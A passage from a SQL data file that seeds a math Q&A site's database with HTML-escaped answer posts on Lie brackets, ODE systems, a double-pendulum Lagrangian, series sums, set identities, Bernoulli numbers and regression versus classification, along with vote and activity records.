\right)$.&lt;br&gt;&lt;/p&gt;

&lt;p&gt;This way $\Psi \left( X \right) = PX $ becomes : &lt;br&gt;
$ \left(
\begin{array}{c , c}
x_1  &amp;amp; x_3  \\
x_2   &amp;amp; x_4  \\
\end{array}
\right)
\left(
\begin{array}{c , c}
X_1 &amp;amp; X_3 \\
X_2  &amp;amp; X_4 \\
\end{array}
\right) = \left(
\begin{array}{c , c}
x_1X_1 + x_3X_2  &amp;amp; x_1X_3 + x_3X_4  \\
x_2X_1  + x_4X_2  &amp;amp; x_2X_3  + x_4X_4 \\
\end{array}
\right)$ &lt;br&gt;
Or : &lt;br&gt;
$\Psi \left( X \right) =\left(
\begin{array}{c , c}
x_1X_1 + x_3X_2   \\
x_2X_1  + x_4X_2   \\
x_1X_3 + x_3X_4  \\
 x_2X_3  + x_4X_4 \\
\end{array}
\right)$ and $\Psi \left( Y \right) =\left(
\begin{array}{c , c}
x_1Y_1 + x_3Y_2   \\
x_2Y_1  + x_4Y_2   \\
x_1Y_3 + x_3Y_4  \\
 x_2Y_3  + x_4Y_4 \\
\end{array}
\right)$ &lt;br&gt;&lt;br&gt;
Now according to the hint we have : &lt;br&gt;
$[\Psi \left( X \right) ,\Psi \left( Y \right) ]= \left(\Psi \left( X \right)_{i}\frac{\partial \Psi \left( Y \right)_{j}}{\partial x_{i}}-\Psi \left( Y \right)_{i}\frac{\partial \Psi \left( X \right)_{j}}{\partial x_{i}}\right)\frac{\partial}{\partial x_{j}} $ (with Einstein summation convention ). &lt;br&gt;&lt;br&gt;
We work out the first component : &lt;br&gt;
$[\Psi \left( X \right) ,\Psi \left( Y \right) ]_1= \left(\Psi \left( X \right)_{i}\frac{\partial \Psi \left( Y \right)_{1}}{\partial x_{i}}-\Psi \left( Y \right)_{i}\frac{\partial \Psi \left( X \right)_{1}}{\partial x_{i}}\right) =
\left(
\Psi \left( X \right)_{1}\frac{\partial \Psi \left( Y \right)_{1}}{\partial x_{1}} +
\Psi \left( X \right)_{3}\frac{\partial \Psi \left( Y \right)_{1}}{\partial x_{3}}
-\Psi \left( Y \right)_{1}\frac{\partial \Psi \left( X \right)_{1}}{\partial x_{1}}  
-\Psi \left( Y \right)_{3}\frac{\partial \Psi \left( X \right)_{1}}{\partial x_{3}}\right) 
 =
\left(
\Psi \left( X \right)_{1}Y_1 +
\Psi \left( X \right)_{3}Y_2
-\Psi \left( Y \right)_{1}X_1
-\Psi \left( Y \right)_{3}X_2
\right) 
 =
\left(
(x_1X_1 +x_3X_2)Y_1 +
(x_1X_3 +x_3X_4)Y_2
-(x_1Y_1 +x_3Y_2)X_1
-(x_1Y_3 +x_3Y_4)X_2
\right) 
 =
x_1(X_3Y_2-X_2Y_3) + x_3(X_2Y_1 -X_1Y_2) + x_3(X_4Y_2-X_2Y_4)
 $&lt;br&gt;&lt;br&gt;
Now calculate the first component of $\Psi \left( [X,Y] \right)$ : &lt;br&gt;
$ \left(
\begin{array}{c , c}
x_1  &amp;amp; x_3  \\
x_2   &amp;amp; x_4  \\
\end{array}
\right)
\left(
\begin{array}{c , c}
X_1Y_1 + X_3Y_2 -Y_1X_1 - Y_3X_2  &amp;amp; X_1Y_3 + X_3Y_4 -Y_1X_3 - Y_3X_4   \\
X_2Y_1  + X_4Y_2 -Y_2X_1  - Y_4X_2 &amp;amp; X_2Y_3  + X_4Y_4 -Y_2X_3  - Y_4X_4 \\
\end{array}
\right)  $ &lt;br&gt;&lt;/p&gt;

&lt;p&gt;We see the first components (and also the other components) are equal, and the generalization to $n &amp;gt; 2$ is trivial.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (126, 106, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (126, 9, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (127, 38, '&lt;p&gt;You can get a linear system out of this differential equation by introducing an artificial time parameter and separating the equation into
\begin{align}
\frac{dy(t)}{dt} &amp;amp;= 4y(t)−3x(t)\\
\frac{dx(t)}{dt} &amp;amp;= 2x(t)−y(t)
\end{align}
or
$$
\begin{bmatrix}\dot x\\\dot y\end{bmatrix}
=
\begin{bmatrix}2&amp;amp;-1\\-3&amp;amp;4\end{bmatrix}
·
\begin{bmatrix} x\\y\end{bmatrix}
$$
where you now can proceed by computing eigenvalues and eigenvectors. In the end you have to invert the function $x(t)$ to get the solution of the original problem as $y(t(x))$.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (127, 108, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (127, 38, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (128, 12, '&lt;ol&gt;
&lt;li&gt;For an arbitrary point on the rod, let $p$ be its distance from the point of connection to the wire. Since the mass is uniformly distributed, then
$$dm=\frac ml dp$$
and the distance of that point from the reference of rotation can be obtained from the law of cosines:
$$r^2=l^2+p^2+2lp\cos\delta$$
Here, $\delta=\theta_2 - \theta_1\,$. The moment of intertia is defined by:
$$dI=r^2 dm\implies I=\frac ml\int_0^l r^2 dp$$
Consequently
$$I=\frac ml\int_0^l(l^2+p^2+2lp\cos\delta)dp=m l^2\left(\frac 43+\cos(\theta_2-\theta_1)\right)$$&lt;/li&gt;
&lt;li&gt;The kinetic energy is calculated from a similar procedure.
$$dK=\frac 12v^2dm\implies K=\frac m{2l}\int_l v^2 dp$$
where
$$\begin{align}v^2&amp;amp;=v_x^2+v_y^2=[\partial_t(l\sin\theta_1+p\sin\theta_2)]^2+[\partial_t(l\cos\theta_1+p\cos\theta_2)]^2\\&amp;amp;=
(l\dot{\theta_1}\cos\theta_1+p\dot{\theta_2}\cos\theta_2)^2+(l\dot{\theta_1}\sin\theta_1+p\dot{\theta_2}\sin\theta_2)^2\\&amp;amp;=
(l\dot{\theta_1})^2+(p\dot{\theta_2})^2+2lp\dot{\theta_1}\dot{\theta_2}\cos\delta\end{align}$$
Thus
$$K=\frac{ml^2}2\left(\dot{\theta_1}^2+\frac 13\dot{\theta_2}^2+\dot{\theta_1}\dot{\theta_2}\cos\delta\right)$$&lt;/li&gt;
&lt;li&gt;And similarly, the potential energy is the result of an integral as well:
$$dU=-gh\,dm\implies U=-\frac {mg}l\int_0^l hdp$$
where
$$h=l\cos\theta_1+p\cos\theta_2$$
which results in $$U=-mgl(\cos\theta_1+\frac 12\cos\theta_2)$$&lt;/li&gt;
&lt;li&gt;Lagrangian is given by $K-U$. Let $\omega_1=\dot\theta_1$ and $\omega_2=\dot\theta_2$ then
$$L=\frac{ml^2}2\left(\omega_1^2+\frac 13\omega_2^2+\omega_1\omega_2\cos(\theta_2-\theta_1)+\frac gl(2\cos\theta_1+\cos\theta_2)\right)$$
and from Euler-Lagrange equations
$$\frac d{dt}\left(\frac{\partial L}{\partial\omega_i}\right)=\frac{\partial L}{\partial\theta_i},\quad i=1,2$$
we have
$$2\dot\omega_1+\dot\omega_2\cos(\theta_2-\theta_1)-\omega_2^2\sin(\theta_2-\theta_1)+2\frac gl\sin\theta_1=0\\
\frac 23\dot\omega_2+\dot\omega_1\cos(\theta_2-\theta_1)+\omega_1^2\sin(\theta_2-\theta_1)+\frac gl\sin\theta_2=0$$
Thus the state-space equations, knowing that the state variables are $\theta_1,\theta_2,\omega_1,\omega_2$ can be written as:
$$\begin{align}\pmatrix{\dot\theta_1\\\dot\theta_2}&amp;amp;=\pmatrix{\omega_1\\ \omega_2}\\
\pmatrix{\dot\omega_1\\\dot\omega_2}&amp;amp;=\pmatrix{2&amp;amp;\cos(\theta_2-\theta_1)\\ \cos(\theta_2-\theta_1)&amp;amp;\frac 23}^{-1}
\pmatrix{\omega_2^2\sin(\theta_2-\theta_1)-2\frac gl\sin\theta_1\\
-\omega_1^2\sin(\theta_2-\theta_1)-\frac gl\sin\theta_2}
\end{align}$$
and you can linearize the system by calculating the Jacobian, $\frac{\partial f}{\partial x}|_{x=0}$ which is a straightforward but tedious process.&lt;/li&gt;
&lt;/ol&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (128, 111, 'True');
INSERT INTO activity ( post_id, user_id, action) VALUES (128, 12, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (128, 12, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (129, 6, '&lt;p&gt;Your inner solution is in $τ$, it should read
$$
y^i(τ) = 1-e^{-τ}+ϵ\Bigl(1-e^{-τ}\bigl(1-τ-\frac{τ^2}2\bigr)\Bigr).
$$
Then the matching rules tell you to equate $y^i(\infty)$ with $y^o(0)$ which gives the constant function $y^o(t)=1+ϵ$.&lt;/p&gt;

&lt;p&gt;As $e^{-τ}τ^2\le 4e^{-τ/2}$ the difference to the constant will be lower than second order in $ϵ$ for $τ&amp;gt;-2\lnϵ$ or $t&amp;gt;2ϵ|\lnϵ|$.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (129, 112, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (129, 6, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (130, 14, '&lt;p&gt;&lt;strong&gt;Hint&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;$$S-x^2S=(x^3+2x^5+3x^7+\cdots)-(x^5+2x^7+3x^9+\cdots)=x^3+x^5+x^7+\cdots$$&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (130, 110, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (130, 14, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 2, 1);
INSERT INTO postinstance (post_id, user_id, description) VALUES (131, 1, '&lt;p&gt;&lt;em&gt;The point is continuity&lt;/em&gt;: In the homotopy-type-theoretic context, decidable equality for a type $X$ means that the type $\Pi_{x,y : X} (x=_Xy)\vee \neg(x=_Xy)$ is inhabited, so you&#x27;re requested to provide, in a continuous manner, either a path between $x$ and $y$ or a proof that such cannot exist. If you&#x27;re working with a connected type, i.e. $\Pi_{x,y:X} \|x=_Xy\|$ is inhabited, then this is equivalent to giving an inhabitant of $\Pi_{x,y : X} (x=_Xy)$, which however is the definition of $X$ being a $-1$-type / proposition.&lt;/p&gt;

&lt;p&gt;If you follow the naive argument, you&#x27;ll also see the flaw: So in $X=B({\mathbb Z}/2{\mathbb Z})$, there&#x27;s only one object, say $\ast$, and for that object we&#x27;d like to pick say the constant path $c_\ast$ as a proof of $\ast=_X\ast$. But now, we move from $\ast$ to $\ast$ in the left argument of $=_X$ via the unique nontrivial loop, say $\gamma$, and continuity would then force us to assign $\gamma\cdot c_\ast=\gamma$ to $\ast$ instead - contradiction.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (131, 115, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (131, 1, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (131, 1, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (131, 1, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (131, 1, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (132, 33, '&lt;p&gt;With recurrences of this type I like the representation in a matrix format. Note, that the binomial-coefficients in your recursive formula occur in the manner of the Pascal-matrix ( = &lt;strong&gt;&lt;em&gt;&quot;P&quot;&lt;/em&gt;&lt;/strong&gt;).         &lt;/p&gt;

&lt;p&gt;The following is the multiplication-scheme for the Bernoulli-numbers:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;                          |      1  |
                          |   -1/2  |  vector B of
                          |    1/6  |  Bernoulli-numbers 
     P*B = dV(-1)*B       |      0  |
                          |  -1/30  |
                          |      0  |
                        * |   1/42  |
                          |   ...   |
  -  -   -   -   -  -  -  +      -  +
   Matrix P               |     =   | 
  -  -   -   -   -  -  -  +      -  +
  1  .   .   .   .  .  .  |      1  |
  1  1   .   .   .  .  .  |    1/2  |
  1  2   1   .   .  .  .  |    1/6  | vector B of
  1  3   3   1   .  .  .  |      0  | Bernoulli-numbers, 
  1  4   6   4   1  .  .  |  -1/30  | each second one having sign changed
  1  5  10  10   5  1  .  |      0  | (this are 1/2,0,0,0, so this is easy 
  1  6  15  20  15  6  1  |   1/42  |  to overlook )
  ...     ...      ...    |    ...  | 
  -  -   -   -   -  -  -  +      -  +
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This scheme illustrates the matrix-product $$P \cdot B = \,^dV(-1) \cdot B $$ where $ \,^dV(-1)= \operatorname{diagonal}([1,-1,1,-1,...]) $      &lt;/p&gt;

&lt;p&gt;&lt;em&gt;(Btw: it seems to me, that the $- {1 \over m+1} ...$ in your formula should be $ {(-1)^m \over m+1} ...$ ) but I might be erring there)&lt;/em&gt;            &lt;/p&gt;

&lt;p&gt;&lt;em&gt;(P.s.: you might also be interested in &lt;a href=&quot;http://go.helms-net.de/math/pascal/bernoulli_en.pdf&quot; rel=&quot;nofollow noreferrer&quot;&gt;this small treatize&lt;/a&gt; on exactly that subject / method)&lt;/em&gt;&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (132, 116, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (132, 33, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (132, 33, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 3, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (133, 35, '&lt;p&gt;By definition $\sum_{n=0}^\infty nx^{2n+1}=\lim_{N\to\infty} S_N$, where $S_N=\sum_{n=0}^N nx^{2n+1}$. &lt;/p&gt;

&lt;p&gt;If $|x|&amp;gt;1$ the terms do not tend to zero and the sum does not converge.&lt;/p&gt;

&lt;p&gt;Suppose $|x|&amp;lt;1$. Now $S_N-x^2S_N=\sum_{n=1}^{N}x^{2n+1}-Nx^{2N+3}=x\frac{1-x^{2N+2}}{1-x^2}-Nx^{2N+3}$.&lt;br&gt;
(Since $x^{2n+1}$ appears once with coefficient $n$ and once with coefficient $-(n-1)$ if $n&amp;lt;N$.) &lt;/p&gt;

&lt;p&gt;So we have $$S_N=x\frac{1-x^{2N+2}}{(1-x^2)^2}-\frac{Nx^{2N+3}}{1-x^2}.$$
The limit of this as $N\to\infty$ is $\frac x{(1-x^2)^2}$.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (133, 110, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (133, 35, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (133, 35, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (133, 35, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (133, 35, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (134, 43, '&lt;p&gt;With the substitutions you insisted, here are the following solutions:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Solution 1:&lt;/strong&gt; Let $u=\cot 2\theta$. Then $du=-2\csc^2 2\theta d\theta$.
Thus,$$\begin{align}
\int \text{csc}^2 2\theta \cot2\theta \,d\theta&amp;amp;=-\frac{1}{2}\int udu\\
&amp;amp;=-\frac{1}{2}\frac{u^2}{2}+k\\
&amp;amp;=-\frac{1}{2}\frac{\cot^2 2\theta}{2}+k
\end{align}$$&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Solution 2:&lt;/strong&gt; Let $u=\csc 2\theta$. Then $du=-2\csc 2\theta \cot 2\theta d\theta$. Thus,
$$\begin{align}
\int \text{csc}^2 2\theta \cot2\theta \,d\theta&amp;amp;=\int \big[\csc 2\theta\cdot\csc 2\theta\cot 2\theta d\theta\big]\\
&amp;amp;=-\frac{1}{2}\int udu\\
&amp;amp;=-\frac{1}{2}\frac{u^2}{2}+C\\
&amp;amp;=-\frac{1}{2}\frac{\csc^22\theta}{2}+C\\
\end{align}$$&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (134, 114, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (134, 43, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 2, 1);
INSERT INTO postinstance (post_id, user_id, description) VALUES (135, 24, '&lt;p&gt;Your proof is rather unclear. What do you mean by $n(A)$ for example.&lt;/p&gt;

&lt;p&gt;The proof is rather straight forward however by showing equivalence between $x\in B$ and $x\in C$. You do this by separating the cases where $x\in A$ and $x\notin A$.&lt;/p&gt;

&lt;p&gt;If $x\in A$ you have $x\in B\cap A \Leftrightarrow x\in B$ and $x\in B\cap A \Leftrightarrow x\in B$, but yoo already have $x\in B\cap A \Leftrightarrow x\in C\cap A$ so it follows that $x\in B\Leftrightarrow x\in C$.&lt;/p&gt;

&lt;p&gt;If on the other hand $x\notin A$ you have $x\in B\cup A \Leftrightarrow x\in B$ and $x\in B\cup A \Leftrightarrow x\in B$, but yoo already have $x\in B\cup A \Leftrightarrow x\in C\cup A$ so it follows that $x\in B\Leftrightarrow x\in C$.&lt;/p&gt;

&lt;p&gt;Since you have $x\in A$ or $x\notin A$ you have $x\in B\Leftrightarrow x\in C$ universally which means $B=C$.&lt;/p&gt;

&lt;hr&gt;

&lt;p&gt;You can reformulate this using set algebra notation:&lt;/p&gt;

&lt;p&gt;Let $U$ be a superset of $A$, $B$ and $C$ (for example $U=A\cup B\cup C$):&lt;/p&gt;

&lt;p&gt;Since $A\cup B = A\cup C$ we have $(U\setminus A)\cap(A\cup B) = (U\setminus A)\cap(A\cup C)$. Since $(U\setminus A)\cap A =\emptyset$ we have:&lt;/p&gt;

&lt;p&gt;$$(U\setminus A)\cap B
= ((U\setminus A)\cap A) \cup ((U\setminus A)\cap B) 
= (U\setminus A)\cap(A\cup B) \\
= (U\setminus A)\cap(A\cup C) = (U\setminus A)\cap C$$&lt;/p&gt;

&lt;p&gt;Now we have that $(U\setminus A) \cup A \supset U$, since $U$ is a superset of $A$, $B$ and $C$ we have $(U\setminus A) \cup A = U$ and $B = U\cap B$ so we have:&lt;/p&gt;

&lt;p&gt;$$B = U\cap B 
= ((U\setminus A) \cup A) \cap B 
= ((U\setminus A) \cap B) \cup (A \cap B)
= ((U\setminus A) \cap C) \cup (A \cap C) = C$$ &lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (135, 104, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (135, 24, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (135, 24, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (135, 24, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (135, 24, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 2, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (136, 48, '&lt;p&gt;By assumptions, $\color\orange{A\cup B=A\cup C}$ and $\color\red{A\cap B=A\cap C}$. Since $B\subset (A\cup B)$ and $C\subset(A\cup C)$, we get
$B=B\cap(A\cup B)$ and $C=C\cap(A\cup C)$, respectively. Hence,
$$\begin{align}
B&amp;amp;=B\cap (\color\orange{A\cup B})\\
&amp;amp;=B\cap(\color\orange{A\cup C})\qquad\text{then use distributive law to get}\\
&amp;amp;=(\color\red{A\cap B})\cup(B\cap C)\\
&amp;amp;=(\color\red{A\cap C})\cup (B\cap C)\qquad\text{again use distributive law to get}\\
&amp;amp;=(\color\orange{A\cup B})\cap C\\
&amp;amp;=(\color\orange{A\cup C})\cap C\\
&amp;amp;=C.
\end{align}$$&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (136, 104, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (136, 48, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (136, 48, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (136, 48, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (137, 43, '&lt;p&gt;Hint: Suppose that $B\neq C$, and give a $x$ in both equalities. You will find a contradiction, analize the cases.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (137, 104, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (137, 43, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (137, 43, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (138, 17, '&lt;p&gt;First we show $B \subseteq C$.
&lt;p&gt;
It suffices to show $x \in B \implies x \in C$.
&lt;p&gt;
Suppose otherwise. Thus, suppose $x \in B$ but $x \notin C$. Then&lt;/p&gt;

&lt;p&gt;\begin{align*}
&amp;amp;x \in B\\[4pt]
\implies\; &amp;amp;x \in A \cup B\\[4pt]
\implies\; &amp;amp;x \in A \cup C&amp;amp;&amp;amp;\text{[since $A\cup B = A \cup C$]}\\[4pt]
\implies\; &amp;amp;x \in A&amp;amp;&amp;amp;\text{[since $x \notin C$]}\\[4pt]
\implies\; &amp;amp;x \in A \cap B&amp;amp;&amp;amp;\text{[since $x \in B$]}\\[4pt]
\implies\; &amp;amp;x \in A \cap C&amp;amp;&amp;amp;\text{[since $A\cap B = A \cap C$]}\\[4pt]
\implies\; &amp;amp;x \in C\\[4pt]
\end{align*}&lt;/p&gt;

&lt;p&gt;contradiction.
&lt;p&gt;
It follows that $x \in B \implies x \in C$, hence $B \subseteq C$, as claimed.
&lt;p&gt;
By analogous reasoning (or by symmetry), we get $C \subseteq B$.
&lt;p&gt;
Therefore $B=C$.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (138, 104, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (138, 17, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (138, 17, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 2, 1);
INSERT INTO postinstance (post_id, user_id, description) VALUES (139, 20, '&lt;p&gt;Your proof is not correct, as you only proved that both $B$ and $C$ have the same &lt;em&gt;number of&lt;/em&gt; elements, not that they have the same elements. To prove that $B=C$ you have to prove that $x\in B$ if and only if $x\in C$.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (139, 104, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (139, 20, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (139, 20, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (139, 20, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (139, 20, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (140, 44, '&lt;p&gt;Write: $B=((A \cup B) \setminus A) \cup (A \cap B)$ and similarly for $C$.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (140, 104, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (140, 44, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (141, 15, '&lt;p&gt;So far, I can see the time scale change to the new variable $\tau$ should yield the following differential equation instead:&lt;/p&gt;

&lt;p&gt;$\epsilon^2y&#x27;&#x27; + (1 + \epsilon \tau)y&#x27; = 0\quad y(0)=0\quad y&#x27;(0) = 1\quad$&lt;/p&gt;

&lt;p&gt;I have not check if there are additional errors though.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (141, 112, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (141, 15, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (142, 38, '&lt;p&gt;Regression is defined as E[Y | X] (the expectation of Y given X).  A subset of these types of models where Y is binary or categorical (including logistic regression and multinomial regression along with many machine learning algorithms that essential have the same target [such as classification trees]) are useful for classification.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (142, 96, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (142, 38, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (142, 38, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 2, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (143, 44, '&lt;p&gt;Regression:  given a set of data,find the best relationship that represent the set of data.
Classification:  given a known relationship, identify the class that the data belongs to.&lt;/p&gt;

&lt;p&gt;We can see that regression and classification starts from opposing ends:  to find a pattern, or to find the pattern that it belong to.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (143, 96, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (143, 44, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (143, 44, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (143, 44, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 3, 2);
INSERT INTO postinstance (post_id, user_id, description) VALUES (144, 47, '&lt;p&gt;Regression and classification are both related to prediction, where regression predicts a value from a continuous set, whereas classification predicts the &#x27;belonging&#x27; to the class.&lt;/p&gt;

&lt;p&gt;eg : price of a house depending on the &#x27;size&#x27; (sq. feet or whatever unit) and say &#x27;location&#x27; of the house, can be some &#x27;numerical value&#x27; (which can be continuous) : this relates to regression.&lt;/p&gt;

&lt;p&gt;Similarly the prediction of price can be in words, viz., &#x27;very costly&#x27;, &#x27;costly&#x27;, &#x27;affordable&#x27;, &#x27;cheap&#x27;, and &#x27;very cheap&#x27; : this relates to classification.&lt;/p&gt;

&lt;p&gt;Each class may correspond to some range of values.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (144, 96, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (144, 47, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (144, 47, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (144, 47, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (144, 47, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (144, 47, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (144, 47, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 5, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (145, 11, '&lt;p&gt;Regression and classification can work on some common problems where the response variable is either continuous or ordinal(?).&lt;/p&gt;

&lt;p&gt;But the result is what would make us to choose between the two. For example simple, hard classifiers simply tries to put the example in specific class(eg SVM).(for eg, whether the project is profitable or not , and doesn&#x27;t account for how much). Where as regression can give exact figure of profit value as some continuous value.&lt;/p&gt;

&lt;p&gt;however in case of classification we can consider probabilistic models (eg logistic regression) where each class or label has some probability which can be weighted by the cost associated with each label or class and thus give us with final value on basis of which we can decide to put it some label or not.(for eg label A has probability of 0.3 but the payoff is huge (1000) however label B has probability 0.7 but the payoff is very low 10.So for maximizing the profit we might label the example as label A instead of B.&lt;/p&gt;

&lt;p&gt;Note: I am still not an expert, perhaps someone would rectify if I am wrong in some part.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (145, 96, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (145, 11, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (145, 11, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (145, 11, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (145, 11, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (145, 11, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (145, 11, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 8, 5);
INSERT INTO postinstance (post_id, user_id, description) VALUES (146, 38, '&lt;p&gt;f: x-&gt; y&lt;/p&gt;

&lt;p&gt;here,&lt;/p&gt;

&lt;p&gt;if y is discrete/categorical variable, then classification problem&lt;/p&gt;

&lt;p&gt;if y is real number/continuous, then regression problem.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (146, 96, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (146, 38, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (146, 38, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (146, 38, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (146, 38, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (146, 38, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (146, 38, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (146, 38, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (146, 38, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (146, 38, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (146, 38, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (146, 38, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (146, 38, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (146, 38, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (146, 38, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
